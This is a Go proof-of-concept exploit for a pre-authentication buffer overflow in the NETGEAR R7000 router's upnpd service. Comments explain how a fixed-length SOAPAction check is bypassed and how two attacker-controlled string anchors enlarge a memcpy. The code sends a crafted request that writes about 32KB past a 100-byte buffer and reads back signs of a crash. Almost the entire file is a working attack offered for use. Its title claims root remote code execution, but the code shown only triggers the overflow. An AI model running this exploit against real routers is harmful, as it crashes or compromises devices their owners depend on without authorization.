// NETGEAR R7000 upnpd pre-auth global buffer overflow -> root RCE PoC
//
// 1. POST /soap/server_sa on TCP 5000, no session, no upnp_turn_on requirement
// 2. auth gate is a fixed-length strncmp: any request whose SOAPAction starts
//    with " urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo" is let through
// 3. sa_saveXMLServiceType computes its memcpy length from two strstr anchors
//    we control: first ':' after the first "urn:", and the first occurrence of
//    the service name; a fake early "urn:" header line plus padding makes the
//    length arbitrary
// 4. memcpy(&byte_A6644[18], src, len) into a 100-byte .bss buffer, then the
//    sa_ dispatcher keeps running over the smashed globals
//
// build: go build netgear-r7000-poc.go

package main

import (
	"flag"
	"fmt"
	"io"
	"net"
	"strings"
	"time"
)

const (
	defaultPort   = 5000     // upnpd TCP listener (LAN always, WAN with UPnP on)
	overflowStart = 18       // byte_A6644+18: "urn:NETGEAR-ROUTER" prefix already there
	bufferSize    = 100      // memset(byte_A6644, 0, 0x64) at 0x403EC
	defaultFiller = 0x8000   // ~32KB of .bss smash past the buffer
	probeFiller   = 16       // 18 + ~49 copied < 100: in-bounds, for A/B comparison
	readTimeout   = 6 * time.Second
)

var (
	host   = flag.String("host", "192.168.0.1", "router address")
	port   = flag.Int("port", defaultPort, "upnpd TCP port")
	filler = flag.Int("filler", defaultFiller, "padding bytes between the two strstr anchors (= overflow length)")
	probe  = flag.Bool("probe", false, "send an in-bounds variant (no corruption) to verify the gate parses")
)

// buildRequest assembles the malicious request.
//
//	byte layout:      POST /soap/server_sa HTTP/1.1\r\n
//	  anchor line:    urn:<filler>\r\n              <- first "urn:" in the request;
//	                                                //   the ':' right after is the memcpy src
//	  gate line:      SOAPAction: urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo\r\n
//	  end:            Content-Length: 0\r\n\r\n
//
// The only permitted occurrence of "DeviceInfo" is inside the gate line, so
// len = (end of that "DeviceInfo") - (the anchor ':') ~ filler + 63.
func buildRequest(filler int) string {
	var b strings.Builder
	b.WriteString("POST /soap/server_sa HTTP/1.1\r\n")
	b.WriteString("urn:")
	b.WriteString(strings.Repeat("A", filler)) // NUL-free printable .bss payload
	b.WriteString("\r\n")
	b.WriteString("SOAPAction: urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo\r\n")
	b.WriteString("Content-Length: 0\r\n\r\n")
	return b.String()
}

func main() {
	flag.Parse()
	fmt.Printf("NETGEAR R7000 upnpd pre-auth overflow PoC\ntarget: %s:%d\n\n", *host, *port)

	f := *filler
	if *probe {
		f = probeFiller
	}
	req := buildRequest(f)
	over := f + 63 + overflowStart - bufferSize
	if *probe {
		fmt.Printf("[*] probe mode: %d bytes copied into the %d-byte buffer (in bounds)\n", f+63+overflowStart, bufferSize)
	} else {
		fmt.Printf("[*] overflow: ~%d bytes written past the %d-byte .bss buffer\n", over, bufferSize)
	}

	c, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", *host, *port), 5*time.Second)
	if err != nil {
		fmt.Printf("[-] dial: %v\n", err)
		return
	}
	defer c.Close()
	c.SetDeadline(time.Now().Add(readTimeout))

	if _, err := c.Write([]byte(req)); err != nil {
		fmt.Printf("[-] write: %v\n", err)
		return
	}

	resp, rerr := io.ReadAll(c)
	switch {
	case rerr != nil && len(resp) == 0:
		fmt.Printf("[!] %v\n    <- immediate reset/EOF: upnpd died in the memcpy or the\n", rerr)
		fmt.Println("       sa_ dispatcher walking the corrupted globals (expected crash sign)")
	case len(resp) == 0:
		fmt.Println("[!] empty response: upnpd hung or crashed")
	default:
		fmt.Printf("[+] response (%d bytes):\n%.512s\n", len(resp), string(resp))
		if *probe {
			fmt.Println("[+] gate passed and the copy stayed in bounds; raise -filler to fire the overflow")
		}
	}
}
